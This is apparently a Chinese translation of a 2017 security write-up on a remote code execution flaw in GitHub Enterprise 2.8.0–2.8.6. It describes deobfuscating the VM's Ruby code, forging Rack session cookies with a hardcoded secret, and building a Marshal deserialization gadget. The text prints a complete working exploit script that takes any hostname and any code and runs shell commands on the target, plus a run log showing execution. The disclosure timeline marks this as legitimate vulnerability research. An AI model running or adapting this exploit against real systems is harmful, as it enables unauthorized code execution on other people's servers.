
# 【漏洞分析】Github企业版远程代码执行漏洞分析


                                阅读量   
                                **94847**
                            
                        |
                        
                                                                                                                                    ![](./img/85710/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：exablue
                                <br>原文地址：[http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html](http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html)

译文仅供参考，具体内容表达以及含义原文为准

****

[![](./img/85710/t01fca6e9c231e322bc.png)](./img/85710/t01fca6e9c231e322bc.png)

翻译：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：170RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



**前言**

眼下，几乎人人都在使用GitHub。如果您有大量的绿皮书或者对自己的代码非常偏执，那么不妨运行自己的GitHub。支付$ 2500美元，就可以得到一个GitHub企业版，可供10个用户使用一年。实际上，Github企业版就是一个虚拟机，只不过提供了一个功能齐全的GitHub实例而已。尽管有一些边缘的情况下偶尔用到了GitHub.enterprise？调用，但是它运行的是与原始代码库一样的代码库。

所以，让我们干掉它。

<br>

**代码的反混淆处理**

当您下载Github企业版时，将会得到一个VirtualBox镜像，你可以将其部署到自己的机器上面。我通过启动随机恢复镜像考察机器的内部情况时，在/data目录里找到了GitHub的代码： 



```
data
├── alambic
├── babeld
├── codeload
├── db
├── enterprise
├── enterprise-manage
├── failbotd
├── git-hooks
├── github
├── git-import
├── gitmon
├── gpgverify
├── hookshot
├── lariat
├── longpoll
├── mail-replies
├── pages
├── pages-lua
├── render
├── slumlord
└── user
```

不幸的是，这些代码是经过混淆处理的，大部分看起来像这样： 



```
require "ruby_concealer"
__ruby_concealer__ "xFFxB3/xDFHx8AxA7xBF=UxEDx91yxDAxDBxA2qV &lt;more binary yada yada&gt;"
```

原来，有一个名为ruby_concealer.so的ruby模块，会对二进制字符串执行Zlib :: Inflate :: inflate，然后利用密钥“This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken”进行XOR运算。就像密钥文字所提示的那样，这的确非常用以破解。现在，我们就通过以下工具对代码进行反混淆处理： 



```
#!/usr/bin/ruby
#
# This tool is only used to "decrypt" the github enterprise source code.
#
# Run in the /data directory of the instance.
require "zlib"
require "byebug"
KEY = "This obfuscation is intended to discourage GitHub Enterprise customers "+
"from making modifications to the VM. We know this 'encryption' is easily broken. "
class String
  def unescape
    buffer = []
    mode = 0
    tmp = ""
    # https://github.com/ruby/ruby/blob/trunk/doc/syntax/literals.rdoc#strings
    sequences = {
      "a"  =&gt; 7,
      "b"  =&gt; 8,
      "t"  =&gt; 9,
      "n"  =&gt; 10,
      "v"  =&gt; 11,
      "f"  =&gt; 12,
      "r"  =&gt; 13,
      "e"  =&gt; 27,
      "s"  =&gt; 32,
      """ =&gt; 34,
      "#"  =&gt; 35,
      "\" =&gt; 92,
      "{"  =&gt; 123,
      "}"  =&gt; 125,
    }
    self.chars.each do |c|
      if mode == 0
        if c == "\"
          mode = 1
          tmp = ""
        else
          buffer &lt;&lt; c.ord
        end
      else
        tmp &lt;&lt; c
        if tmp[0] == "x"
          if tmp.length == 3
            buffer &lt;&lt; tmp[1..2].hex
            mode = 0
            tmp = ""
            next
          else
            next
          end
        end
        if tmp.length == 1 &amp;&amp; sequences[tmp]
          buffer &lt;&lt; sequences[tmp]
          mode = 0
          tmp = ""
          next
        end
        raise "Unknown sequences: "\#{tmp}""
      end
    end
    buffer.pack("C*")
  end
  def decrypt
    i, plaintext = 0, ''
    Zlib::Inflate.inflate(self).each_byte do |c|
      plaintext &lt;&lt; (c ^ KEY[i%KEY.length].ord).chr
      i += 1
    end
    plaintext
  end
end
Dir.glob("**/*.rb").each do |file|
  header = "require "ruby_concealer.so"n__ruby_concealer__ ""
  len = header.length
  File.open(file, "r+") do |fh|
    if fh.read(len) == header
      puts file
      ciphertext = fh.read[0..-1].unescape
      plaintext  = ciphertext.decrypt
      fh.truncate(0)
      fh.rewind
      fh.write(plaintext)
    end
  end
end
```



**企业管理接口**

现在，我们已经得到了反混淆后的代码，自然就可以开始寻找漏洞了。我认为管理控制台将是一个不错的攻击目标。如果你是管理员，你可以添加SSH密钥（用于root权限）、关闭服务等。但对于普通权限的用户来说，其界面如下所示： 

[![](./img/85710/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017e4a739c36209d30.png)

毫不奇怪，代码可以从/data/enterprise-manager/current /中找到。

<br>

**会话管理**

由于管理接口是一个Rack应用程序，所以首先要做的事情就是查看config.ru文件，以便进一步了解这个应用程序的架构详情，我注意到它使用了Rack :: Session :: Cookie。就像您从名称中可以猜到的那样，这是一个将会话数据转储到cookie的Rack中间件。



```
# Enable sessions
use Rack::Session::Cookie,
  :key          =&gt; "_gh_manage",
  :path         =&gt; "/",
  :expire_after =&gt; 1800, # 30 minutes in seconds
  :secret       =&gt; ENV["ENTERPRISE_SESSION_SECRET"] || "641dd6454584ddabfed6342cc66281fb"
```

实际上，它在内部完成的工作只有一件，那就是：

**将会话数据序列化为cookie**

当这个Rack应用程序完成时，Rack :: Session :: Cookie将使用下面展示的算法将会话数据保存到Cookie中： 

取得应用程序放在env [“rack.session”]的会话哈希值（{“user_id”=&gt; 1234，“admin”=&gt; true}或类似的东西）

运行Marshal.dump将这个ruby哈希值转换为字符串

对生成的字符串进行Base64编码

并附加已经用密钥进行了加盐的数据哈希值，以防止篡改。

将结果保存到_gh_manage cookie中。

对来自cookie的会话数据进行反序列化处理

让我们通过一个例子来仔细考察反序列化的过程：为了从cookie加载数据，Rack :: Session :: Cookie需要执行相应的操作。例如，将cookie设置为下面的值。



```
cookie = "BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTRhYjMwYjIyM2Y5MTMzMGFiMmJj%0AMjdiMDI1O"+
"WY1ODkxMzA2OGNlMGVmOTM0ODA1Y2QwZGRiZGQwYTM3MTEwNzgG%0AOwBGSSIPY3NyZi50b2tlbgY7AFR"+
"JIjFKMzgrbExpUnpkN3ZEazZld1N1eUhY%0AcjQ0akFlc3NjM1ZFVzArYjI3aWdNPQY7AEY%3D%0A--5e"+
"b02d2e1b1845e9f766c2282de2d19dc64d0fb9"
```

它根据“- -”对字符串进行拆解，处理反向url转义，并使用base64对结果进行解码，从而得到最终的二进制数据和签名。



```
data, hmac = cookie.split("--")
data = CGI.unescape(data).unpack("m").first
# =&gt; data = "x04b{aI"x0Fsession_idx06:x06ETI"E4ab30b223f91330ab2bc27b025
# 9f58913068ce0ef934805cd0ddbdd0a3711078x06;x00FI"x0Fcsrf.tokenx06;x00TI"
# 1J38+lLiRzd7vDk6ewSuyHXr44jAessc3VEW0+b27igM=x06;x00F"
# =&gt; hmac = "5eb02d2e1b1845e9f766c2282de2d19dc64d0fb9
```

然后计算预期的hmac： 



```
secret = "641dd6454584ddabfed6342cc66281fb"
expected_hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
```

如果计算出的哈希值与预期的哈希值相匹配的话，则将其传递给Marshal.load。否则，将其丢弃： 



```
if expected_hmac == hmac
  session = Marshal.load(data)
end
# =&gt; {"session_id" =&gt; "4ab30b223f91330ab2bc27b0259f58913068ce0ef934805cd0ddbdd0a3711078",
#     "csrf.token" =&gt; "J38+lLiRzd7vDk6ewSuyHXr44jAessc3VEW0+b27igM="}
```



**漏洞分析 **

上面的代码存在两个问题。

ENV ["ENTERPRISE_SESSION_SECRET"]从未进行设置，因此该密钥默认为上述值。您可以给任意Cookie进行签名并根据需要设置会话ID。但这并没有什么帮助，因为会话ID是32个随机字节。

不过，你现在可以将任意数据输入Marshal.load，因为你可以伪造一个有效的签名。与JSON不同，Marshal格式不仅允许使用散列、数组和静态类型，而且还允许使用ruby对象。这就会导致远程代码执行漏洞，这一点将在下面介绍。

**制作漏洞代码**

要想运行任意代码，我们需要生成运行反序列化代码的Marshal.load的输入。为此，我需要精心构造获访问该对象的代码。这需要分两步完成：

**恶意ERb模板**

解析.erb模板的方式是Erubis读取模版并生成一个Erubis :: Eruby对象，该对象保存有位于@src实例变量中的模板代码。所以如果我们把自己的代码放入那里的话，那么只需要设法调用object.result，我们的代码就会得到运行。



```
erubis = Erubis::Eruby.allocate
erubis.instance_variable_set :@src, "%x{id &gt; /tmp/pwned}; 1"
# erubis.result would run the code
```

**一个邪恶的InstanceVariableProxy**

在ActiveSupport中，提供了一种便捷的方式来通知用户某些东西发生了变化。它被称为ActiveSupport :: Deprecation :: DeprecatedInstanceVariableProxy，我们可以通过它来废弃实例变量。如果在这个废弃的实例变量上运行方法话，它会为你调用new生成的方法并发出警告。这正是我们想要的，具体如下所示： 



```
proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erubis, :result)
session = {"session_id" =&gt; "", "exploit" =&gt; proxy}
```

如果我现在访问session [“exploit”]，它会调用erubis.result，然后运行嵌入的shell命令id&gt; / tmp / pwned并返回1。

现在，我们只要把它封装成一个会话cookie，用密钥进行签名，就可以进行完成远程代码执行攻击了。

<br>

**漏洞利用**

下面是我提供给GitHub的完整漏洞利用代码，注意，它仅限于教育用途。



```
#!/usr/bin/ruby
require "openssl"
require "cgi"
require "net/http"
require "uri"
SECRET = "641dd6454584ddabfed6342cc66281fb"
puts '                     ___.   .__                 '
puts '  ____ ___  ________ _ |__ |  |  __ __   ____  '
puts '_/ __ \\  /  /__   | __ |  | |  |  _/ __  '
puts '  ___/ &gt;    &lt;  / __ | _   |_|  |  /  ___/ '
puts ' ___  &gt;__/_ (____  /___  /____/____/  ___  &gt;'
puts '     /      /     /    /                 / '
puts ''
puts "github Enterprise RCE exploit"
puts "Vulnerable: 2.8.0 - 2.8.6"
puts "(C) 2017 iblue &lt;iblue@exablue.de&gt;"
unless ARGV[0] &amp;&amp; ARGV[1]
  puts "Usage: ./exploit.rb &lt;hostname&gt; &lt;valid ruby code&gt;"
  puts ""
  puts "Example: ./exploit.rb ghe.example.org "%x(id &gt; /tmp/pwned)""
  exit 1
end
hostname = ARGV[0]
code = ARGV[1]
# First we get the cookie from the host to check if the instance is vulnerable.
puts "[+] Checking if #{hostname} is vulnerable..."
http = Net::HTTP.new(hostname, 8443)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE # We may deal with self-signed certificates
rqst = Net::HTTP::Get.new("/")
while res = http.request(rqst)
  case res
  when Net::HTTPRedirection then
    puts "  =&gt; Following redirect to #{res["location"]}..."
    rqst = Net::HTTP::Get.new(res["location"])
  else
    break
  end
end
def not_vulnerable
  puts "  =&gt; Host is not vulnerable"
  exit 1
end
unless res['Set-Cookie'] =~ /A_gh_manage/
  not_vulnerable
end
# Parse the cookie
begin
  value = res['Set-Cookie'].split("=", 2)[1]
  data = CGI.unescape(value.split("--").first)
  hmac = value.split("--").last.split(";", 2).first
  expected_hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, SECRET, data)
  not_vulnerable if expected_hmac != hmac
rescue
  not_vulnerable
end
puts "  =&gt; Host is vulnerable"
# Now construct the cookie
puts "[+] Assembling magic cookie..."
# Stubs, since we don't want to execute the code locally.
module Erubis;class Eruby;end;end
module ActiveSupport;module Deprecation;class DeprecatedInstanceVariableProxy;end;end;end
erubis = Erubis::Eruby.allocate
erubis.instance_variable_set :@src, "#{code}; 1"
proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
proxy.instance_variable_set :@instance, erubis
proxy.instance_variable_set :@method, :result
proxy.instance_variable_set :@var, "@result"
session = {"session_id" =&gt; "", "exploit" =&gt; proxy}
# Marshal session
dump = [Marshal.dump(session)].pack("m")
hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, SECRET, dump)
puts "[+] Sending cookie..."
rqst = Net::HTTP::Get.new("/")
rqst['Cookie'] = "_gh_manage=#{CGI.escape("#{dump}--#{hmac}")}"
res = http.request(rqst)
if res.code == "302"
  puts "  =&gt; Code executed."
else
  puts "  =&gt; Something went wrong."
end
```

**用法示例 **



```
iblue@raven:/tmp$ ruby exploit.rb 192.168.1.165 "%x(id &gt; /tmp/pwned)"
                     ___.   .__
  ____ ___  ________ _ |__ |  |  __ __   ____
_/ __ \  /  /__   | __ |  | |  |  _/ __ 
  ___/ &gt;    &lt;  / __ | _   |_|  |  /  ___/
 ___  &gt;__/_ (____  /___  /____/____/  ___  &gt;
     /      /     /    /                 /
[+] Checking if 192.168.1.165 is vulnerable...
  =&gt; Following redirect to /setup/...
  =&gt; Following redirect to https://192.168.1.165:8443/setup/unlock?redirect_to=/...
  =&gt; Host is vulnerable
[+] Assembling magic cookie...
[+] Sending cookie...
  =&gt; Code executed.
iblue@raven:/tmp$ ssh -p122 admin@192.168.1.165
     ___ _ _   _  _      _      ___     _                    _
    / __(_) |_| || |_  _| |__  | __|_ _| |_ ___ _ _ _ __ _ _(_)___ ___
   | (_ | |  _| __ | || | '_  | _|| '   _/ -_) '_| '_  '_| (_-&lt;/ -_)
    ___|_|__|_||_|_,_|_.__/ |___|_||______|_| | .__/_| |_/__/___|
                                                   |_|
Administrative shell access is permitted for troubleshooting and performing
documented operations procedures only. Modifying system and application files,
running programs, or installing unsupported software packages may void your
support contract. Please contact GitHub Enterprise technical support at
enterprise@github.com if you have a question about the activities allowed by
your support contract.
Last login: Thu Jan 26 10:10:19 2017 from 192.168.1.145
admin@ghe-deepmagic-de:~$ cat /tmp/pwned 
uid=605(enterprise-manage) gid=605(enterprise-manage) groups=605(enterprise-manage)
```



**时间线**



2017年1月26日 将问题报告给GitHub

2017年1月26日 GitHub将问题分类

2017年1月31日 被要求更新

2017年1月31日  GitHub颁发一万美元的赏金、T恤、几张贴纸和一个免费的个人计划。哈哈，名人堂也有俺的一席之地了， 真棒！

2017年1月31日 GitHub Enterprise 2.8.7发布

2017年3月14日 在完成本文的时候，GitHub又支付了8000美元。Wow。

<br>

**致谢**

特别感谢Phenoelit的joernchen撰写的关于ruby的安全文章，这里的漏洞利用代码借鉴了他的思路，非常感谢！

此外，我还要特别感谢Orange，正是他关于攻击GitHub企业版方面的博客文章才引起了我对这方面的兴趣。
